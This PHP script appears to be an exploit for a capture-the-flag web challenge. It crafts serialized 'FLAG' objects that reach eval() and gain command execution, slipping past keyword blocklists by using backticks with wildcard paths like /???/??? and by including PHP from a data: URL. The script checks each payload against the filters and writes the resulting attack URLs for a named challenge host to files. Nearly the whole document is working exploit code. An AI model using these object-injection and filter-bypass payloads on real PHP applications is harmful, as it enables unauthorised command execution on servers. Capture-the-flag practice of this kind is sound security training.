<?php
// 新策略：让$a在转换为字符串后成为一个有效函数
// 例如：让$a最终是'system', 'passthru'等，但要绕过check

$blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 'S', 'open'];
$blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

$pattern_a = '/' . implode('|', array_map(function ($x) {
    return preg_quote($x, '/'); }, $blocked_a)) . '/i';
$pattern_b = '/' . implode('|', array_map(function ($x) {
    return preg_quote($x, '/'); }, $blocked_b)) . '/i';

echo "=== Understanding the flow ===\n";
echo "1. __construct: eval(\$a.\$b) executes\n";
echo "2. __destruct: \$a('', \$b) calls function\n";
echo "3. We need \$a to be a two-param function name after eval\n\n";

echo "=== Test: var_dump as function ===\n";
$a = ';$_=`;die(';
$b = '$_);';

echo "a: $a\n";
echo "b: $b\n";
echo "eval result: " . $a . $b . "\n";
echo "After eval, \$a becomes: ';$_=`;die'\n";
echo "a blocked: " . (preg_match($pattern_a, $a) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b) ? "YES" : "NO") . "\n\n";

// 重新思考：需要在eval中完成攻击，并且让__destruct不报错
echo "=== Better approach: Make eval do all the work, let destruct fail silently ===\n";

// 使用var_dump或print_r来输出，但这些被blocked了
// 使用echo? echo不是函数

echo "=== Try: Use exit in eval to prevent __destruct ===\n";
$a = ';`/???/???%20/????`;exit';
$b = '();';

echo "a: $a\n";
echo "b: $b\n";
echo "This will execute command and exit before __destruct\n";
echo "a blocked: " . (preg_match($pattern_a, $a) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a) && !preg_match($pattern_b, $b)) {
    $ser = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a) . ':"' . $a . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b) . ':"' . $b . '";}';
    $url = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser);
    echo "URL:\n$url\n\n";
    file_put_contents('url_exit.txt', $url);
}

echo "=== Try: Echo in backticks with HTML ===\n";
$a2 = ';include("data:,<?=\\`/???/???%20/????\\`;exit;?>");';
$b2 = '//';

echo "a: $a2\n";
echo "b: $b2\n";
echo "a blocked: " . (preg_match($pattern_a, $a2) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b2) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a2) && !preg_match($pattern_b, $b2)) {
    $ser2 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a2) . ':"' . $a2 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b2) . ':"' . $b2 . '";}';
    $url2 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser2);
    echo "URL:\n$url2\n\n";
    file_put_contents('url_data.txt', $url2);
}

echo "=== Try: Direct command with echo ===\n";
$a3 = ';$x=`/???/???%20/????`;';
$b3 = 'die($x);';

echo "a: $a3\n";
echo "b: $b3\n";
echo "eval result: $a3$b3\n";
echo "After eval, \$a is the original string\n";
echo "a blocked: " . (preg_match($pattern_a, $a3) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b3) ? "YES (contains e,i)" : "NO") . "\n\n";

echo "blocked_b contains 'e', so die() is blocked for \$b\n\n";

echo "=== Working solution: exit in a ===\n";
$a4 = ';include("data:,<?=\\`/*\\`;exit;?>");';
$b4 = '//';

echo "a: $a4\n";
echo "b: $b4\n";
echo "This includes data URL with command output and exits\n";
echo "a blocked: " . (preg_match($pattern_a, $a4) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b4) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a4) && !preg_match($pattern_b, $b4)) {
    $ser4 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a4) . ':"' . $a4 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b4) . ':"' . $b4 . '";}';
    $url4 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser4);
    echo "URL:\n$url4\n\n";
    file_put_contents('url_final.txt', $url4);
}
